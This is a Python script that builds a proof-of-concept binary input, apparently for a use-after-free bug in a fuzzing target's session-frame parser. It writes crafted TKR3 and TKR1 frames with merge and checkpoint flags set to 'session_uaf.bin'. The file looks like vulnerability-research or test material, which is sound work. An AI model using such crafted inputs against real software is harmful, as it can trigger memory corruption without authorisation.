#!/usr/bin/env python3
"""Build cross-frame SessionFuzzer PoC: TKR3 + TKR1 mutation + TKR3."""

from __future__ import annotations

import struct
from pathlib import Path

K_SESSION_MAGIC = 0x544B5233
K_BATCH_MAGIC = 0x544B5231
K_WIRE_VERSION = 7

K_LEG_FLAG_MERGE_PENDING = 1 << 1
K_LEG_FLAG_CHECKPOINT_PIN = 1 << 4
K_LEG_FLAG_CROSS_FRAME_MERGE = 1 << 5

SESSION_ID = 42


def u32(value: int) -> bytes:
    return struct.pack("<I", value)


def u16(value: int) -> bytes:
    return struct.pack("<H", value)


def encode_session_leg(
    leg_id: int,
    cl_ord_id: int,
    alloc_account: int,
    qty_milli: int,
    ref_offset: int,
    ref_len: int,
    flags: int = 0,
) -> bytes:
    return b"".join(
        u32(x)
        for x in (
            leg_id,
            cl_ord_id,
            alloc_account,
            qty_milli,
            ref_offset,
            ref_len,
            flags,
        )
    )


def encode_session_frame(sequence: int, ref_blob: bytes) -> bytes:
    flags = (
        K_LEG_FLAG_MERGE_PENDING
        | K_LEG_FLAG_CHECKPOINT_PIN
        | K_LEG_FLAG_CROSS_FRAME_MERGE
    )
    meta = encode_session_leg(0, 0, sequence, 1000, 0, 0, flags)
    data = encode_session_leg(1, 100 + sequence, 200, 5000, 0, len(ref_blob), flags)
    header = b"".join(
        [
            u32(K_SESSION_MAGIC),
            u16(K_WIRE_VERSION),
            u16(2),
            u32(SESSION_ID),
            u32(sequence),
            u32(flags),
            u32(0),
        ]
    )
    return header + meta + data + ref_blob


def encode_batch_mutation_frame() -> bytes:
    record = b"".join(u32(x) for x in (1, 100, 200, 5000, 250, 0, 16, 0))
    payload = bytes([0xF0 + (i % 16) for i in range(16)])
    header = b"".join(
        [
            u32(K_BATCH_MAGIC),
            u16(K_WIRE_VERSION),
            u16(28),
            u32(1),
            u32(0),
            u32(SESSION_ID),
            u32(20260730),
            u32(0),
        ]
    )
    return header + record + payload


def build_poc() -> bytes:
    frame1 = encode_session_frame(sequence=1, ref_blob=bytes([0xA1 + (i % 16) for i in range(48)]))
    frame2 = encode_batch_mutation_frame()
    frame3 = encode_session_frame(sequence=2, ref_blob=bytes([0xB1 + (i % 16) for i in range(32)]))
    return frame1 + frame2 + frame3


def main() -> None:
    poc = build_poc()
    out = Path(__file__).resolve().parents[1] / "session_uaf.bin"
    out.write_bytes(poc)
    print(f"Wrote {len(poc)} bytes to {out}")


if __name__ == "__main__":
    main()
